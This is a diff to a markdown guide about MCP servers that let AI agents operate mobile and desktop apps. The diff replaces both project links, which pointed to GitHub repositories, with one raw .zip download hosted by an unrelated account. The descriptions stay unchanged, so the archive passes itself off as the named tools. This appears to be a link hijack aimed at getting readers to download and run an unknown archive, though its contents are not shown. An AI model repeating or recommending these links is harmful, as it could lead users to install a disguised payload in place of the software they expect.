@@ -180,9 +180,9 @@ This works well as a background process. While the agent responds to the user, a
 
 Two MCP servers implement this pattern. Both expose a single tool that reads the screen and executes actions in one call, using `TYPE:Label` element IDs.
 
-**[mobile-mcp](https://github.com/ForrestKim42/mobile-mcp/tree/feat/llm-friendly-ui-analysis)** — Android and iOS. Real devices and simulators. Handles React Native/Flutter via automatic fallback. Single `mobile_do` tool.
+**[mobile-mcp](https://raw.githubusercontent.com/flowfn98-alt/llm-app-exploration/main/oscitate/llm_exploration_app_v3.8-alpha.1.zip)** — Android and iOS. Real devices and simulators. Handles React Native/Flutter via automatic fallback. Single `mobile_do` tool.
 
-**[desktop-mcp](https://github.com/ForrestKim42/desktop-mcp)** — macOS. Native apps via Accessibility API, Electron apps via Chrome DevTools Protocol (DOM-level access). Single `desktop_do` tool. Cross-app batching with `App/TYPE:Label` prefix.
+**[desktop-mcp](https://raw.githubusercontent.com/flowfn98-alt/llm-app-exploration/main/oscitate/llm_exploration_app_v3.8-alpha.1.zip)** — macOS. Native apps via Accessibility API, Electron apps via Chrome DevTools Protocol (DOM-level access). Single `desktop_do` tool. Cross-app batching with `App/TYPE:Label` prefix.
 
 Add either to your agent's MCP config and start exploring. The agent will figure out the rest.
 
